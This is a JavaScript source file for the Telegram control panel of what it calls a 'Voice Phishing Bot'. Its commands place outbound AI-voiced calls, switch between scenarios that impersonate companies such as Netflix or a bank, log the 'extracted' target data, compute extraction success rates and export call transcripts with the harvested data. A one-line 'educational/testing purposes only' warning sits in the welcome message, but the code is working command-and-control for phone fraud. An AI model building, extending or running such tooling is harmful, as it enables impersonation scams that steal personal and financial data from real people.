import TelegramBot from 'node-telegram-bot-api';
import { getConfig, updateConfig, loadScenario, getScenarios } from './configLoader.js';
import { makeOutboundCall } from './voiceEngine.js';
import { 
  getRecentCallLogs, 
  createCampaign, 
  getAllCampaigns,
  getCallLog 
} from './database.js';
import { writeFileSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

let bot;
const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID;

/**
 * Initialize Telegram bot
 */
export async function initTelegramBot() {
  bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
  
  // Command handlers
  bot.onText(/\/start/, handleStart);
  bot.onText(/\/help/, handleHelp);
  bot.onText(/\/status/, handleStatus);
  bot.onText(/\/config/, handleConfig);
  bot.onText(/\/scenarios/, handleScenarios);
  bot.onText(/\/scenario (.+)/, handleSetScenario);
  bot.onText(/\/call (.+)/, handleMakeCall);
  bot.onText(/\/recent/, handleRecentCalls);
  bot.onText(/\/campaigns/, handleCampaigns);
  bot.onText(/\/stats/, handleStats);
  bot.onText(/\/update (.+)/, handleUpdateConfig);
  bot.onText(/\/export/, handleExport);
  
  console.log('✅ Telegram bot initialized');
}

/**
 * Check if user is admin
 */
function isAdmin(userId) {
  console.log('Checking admin access for userId:', userId, 'against ADMIN_ID:', ADMIN_ID);
  return userId.toString() === ADMIN_ID.toString();
}

/**
 * /start command
 */
async function handleStart(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) {
    bot.sendMessage(chatId, '❌ Unauthorized access.');
    return;
  }
  
  const welcomeMessage = `
🤖 *Voice Phishing Bot Control Panel*

Welcome! This bot allows you to control and monitor voice phishing campaigns.

*Available Commands:*
/help - Show all commands
/status - Show bot status
/config - View current configuration
/scenarios - List available scenarios
/scenario [name] - Switch to a scenario
/call [number] - Make a test call
/recent - View recent call logs
/campaigns - View campaigns
/stats - View statistics
/update [json] - Update configuration
/export - Export call logs

⚠️ *Warning: For educational/testing purposes only*
  `;
  
  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
}

/**
 * /help command
 */
async function handleHelp(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const helpMessage = `
📚 *Command Reference*

*Configuration:*
/config - View current config
/scenarios - List scenarios
/scenario netflix - Load Netflix scenario
/update {"tone":"friendly"} - Update config

*Calling:*
/call +1234567890 - Make test call
/recent - Last 10 calls
/campaigns - View all campaigns

*Monitoring:*
/status - Bot health status
/stats - Success rate & statistics
/export - Download call logs as JSON

*Examples:*
\`/scenario bank\`
\`/call +14155551234\`
\`/update {"maxAttempts": 5}\`
  `;
  
  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
}

/**
 * /status command
 */
async function handleStatus(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const config = getConfig();
  const uptime = process.uptime();
  const hours = Math.floor(uptime / 3600);
  const minutes = Math.floor((uptime % 3600) / 60);
  
  const statusMessage = `
✅ *Bot Status: Online*

⏱ *Uptime:* ${hours}h ${minutes}m
🎭 *Current Scenario:* ${config.botName}
🎯 *Target:* ${config.targetInfo}
📞 *Twilio:* Connected
🧠 *AI Model:* ${config.groqModel}
🔊 *TTS Voice:* ${config.playhtVoice || 'Default'}
🎚 *Max Attempts:* ${config.maxAttempts}

Last updated: ${new Date().toLocaleString()}
  `;
  
  bot.sendMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
}

/**
 * /config command
 */
async function handleConfig(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const config = getConfig();
  
  const configMessage = `
⚙️ *Current Configuration*

*Bot Identity:*
Name: ${config.botName}
Tone: ${config.tone}

*Target Information:*
Type: ${config.targetInfo}
Format: ${config.targetFormat}

*Behavior:*
Initial Question: "${config.initialQuestion}"
Goal: ${config.goal}
Max Attempts: ${config.maxAttempts}

*AI Settings:*
Model: ${config.groqModel}
Voice: ${config.playhtVoice || 'Default'}
  `;
  
  bot.sendMessage(chatId, configMessage, { parse_mode: 'Markdown' });
}

/**
 * /scenarios command
 */
async function handleScenarios(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const scenarios = getScenarios();
  const config = getConfig();
  
  let message = '🎭 *Available Scenarios:*\n\n';
  
  scenarios.forEach(scenario => {
    const scenarioData = config.scenarios[scenario];
    message += `📌 *${scenario}*\n`;
    message += `   Bot: ${scenarioData.botName}\n`;
    message += `   Target: ${scenarioData.targetInfo}\n`;
    message += `   Command: /scenario ${scenario}\n\n`;
  });
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

/**
 * /scenario [name] command
 */
async function handleSetScenario(msg, match) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const scenarioName = match[1];
  const success = loadScenario(scenarioName);
  
  if (success) {
    const config = getConfig();
    bot.sendMessage(
      chatId, 
      `✅ Scenario switched to: *${config.botName}*\n\nTarget: ${config.targetInfo}`,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(chatId, `❌ Scenario "${scenarioName}" not found. Use /scenarios to see available options.`);
  }
}

/**
 * /call [number] command
 */
async function handleMakeCall(msg, match) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const phoneNumber = match[1];
  
  // Validate phone number format
  if (!phoneNumber.match(/^\+?[1-9]\d{1,14}$/)) {
    bot.sendMessage(chatId, '❌ Invalid phone number format. Use E.164 format (e.g., +1234567890)');
    return;
  }
  
  bot.sendMessage(chatId, `📞 Initiating call to ${phoneNumber}...`);
  
  const result = await makeOutboundCall(phoneNumber);
  
  if (result.success) {
    bot.sendMessage(
      chatId,
      `✅ *Call initiated successfully!*\n\nCall SID: \`${result.callSid}\`\n\nUse /recent to monitor progress.`,
      { parse_mode: 'Markdown' }
    );
  } else {
    bot.sendMessage(chatId, `❌ Failed to initiate call: ${result.error}`);
  }
}

/**
 * /recent command
 */
async function handleRecentCalls(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const calls = await getRecentCallLogs(10);
  
  if (calls.length === 0) {
    bot.sendMessage(chatId, '📭 No recent calls found.');
    return;
  }
  
  let message = '📞 *Recent Calls:*\n\n';
  
  calls.forEach((call, index) => {
    message += `${index + 1}. *${call.fromNumber}*\n`;
    message += `   Status: ${getStatusEmoji(call.status)} ${call.status}\n`;
    message += `   Scenario: ${call.scenario}\n`;
    message += `   Attempts: ${call.attempts}\n`;
    
    if (call.extractedData?.targetInfo) {
      message += `   ✅ Extracted: ${call.extractedData.targetInfo}\n`;
    }
    
    message += `   Time: ${new Date(call.startedAt).toLocaleString()}\n\n`;
  });
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

/**
 * /campaigns command
 */
async function handleCampaigns(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const campaigns = await getAllCampaigns();
  
  if (campaigns.length === 0) {
    bot.sendMessage(chatId, '📭 No campaigns found.');
    return;
  }
  
  let message = '🎯 *Active Campaigns:*\n\n';
  
  campaigns.forEach((campaign, index) => {
    message += `${index + 1}. *${campaign.name}*\n`;
    message += `   Scenario: ${campaign.scenario}\n`;
    message += `   Status: ${campaign.status}\n`;
    message += `   Total Calls: ${campaign.stats.totalCalls}\n`;
    message += `   Successful: ${campaign.stats.successfulCalls}\n`;
    message += `   Data Extracted: ${campaign.stats.dataExtracted}\n\n`;
  });
  
  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
}

/**
 * /stats command
 */
async function handleStats(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const calls = await getRecentCallLogs(100);
  
  const total = calls.length;
  const completed = calls.filter(c => c.status === 'completed').length;
  const successful = calls.filter(c => c.extractedData?.verified).length;
  const failed = calls.filter(c => c.status === 'failed').length;
  
  const successRate = total > 0 ? ((successful / total) * 100).toFixed(2) : 0;
  
  const statsMessage = `
📊 *Statistics (Last 100 Calls)*

📞 Total Calls: ${total}
✅ Completed: ${completed}
🎯 Successful: ${successful}
❌ Failed: ${failed}

📈 *Success Rate:* ${successRate}%

*Performance Metrics:*
Avg Duration: ${calculateAvgDuration(calls)}s
Most Common Status: ${getMostCommonStatus(calls)}
  `;
  
  bot.sendMessage(chatId, statsMessage, { parse_mode: 'Markdown' });
}

/**
 * /update command
 */
async function handleUpdateConfig(msg, match) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  try {
    const jsonStr = match[1];
    const updates = JSON.parse(jsonStr);
    
    updateConfig(updates);
    
    bot.sendMessage(chatId, '✅ Configuration updated successfully!');
    
  } catch (error) {
    bot.sendMessage(chatId, `❌ Invalid JSON format: ${error.message}`);
  }
}

/**
 * /export command
 */
async function handleExport(msg) {
  const chatId = msg.chat.id;
  
  if (!isAdmin(msg.from.id)) return;
  
  const calls = await getRecentCallLogs(1000);
  
  const exportData = {
    exportedAt: new Date().toISOString(),
    totalCalls: calls.length,
    calls: calls.map(call => ({
      callSid: call.callSid,
      from: call.fromNumber,
      to: call.toNumber,
      scenario: call.scenario,
      status: call.status,
      attempts: call.attempts,
      extractedData: call.extractedData,
      duration: call.duration,
      startedAt: call.startedAt,
      completedAt: call.completedAt,
      transcripts: call.transcripts
    }))
  };
  
  const filename = `call_logs_${Date.now()}.json`;
  const filepath = join(__dirname, '..', filename);
  
  writeFileSync(filepath, JSON.stringify(exportData, null, 2));
  
  bot.sendDocument(chatId, filepath, {
    caption: `📦 Call logs exported\n\nTotal calls: ${calls.length}`
  });
}

/**
 * Helper functions
 */
function getStatusEmoji(status) {
  const emojis = {
    'initiated': '🔵',
    'in-progress': '🟡',
    'completed': '🟢',
    'failed': '🔴',
    'hung-up': '⚫'
  };
  return emojis[status] || '⚪';
}

function calculateAvgDuration(calls) {
  const validCalls = calls.filter(c => c.duration > 0);
  if (validCalls.length === 0) return 0;
  
  const total = validCalls.reduce((sum, call) => sum + call.duration, 0);
  return Math.round(total / validCalls.length);
}

function getMostCommonStatus(calls) {
  const statusCount = {};
  calls.forEach(call => {
    statusCount[call.status] = (statusCount[call.status] || 0) + 1;
  });
  
  return Object.entries(statusCount)
    .sort((a, b) => b[1] - a[1])[0]?.[0] || 'N/A';
}

/**
 * Send notification to admin
 */
export async function notifyAdmin(message) {
  try {
    if (bot && ADMIN_ID) {
      await bot.sendMessage(ADMIN_ID, message, { parse_mode: 'Markdown' });
    }
  } catch (error) {
    console.error('❌ Error sending admin notification:', error);
  }
}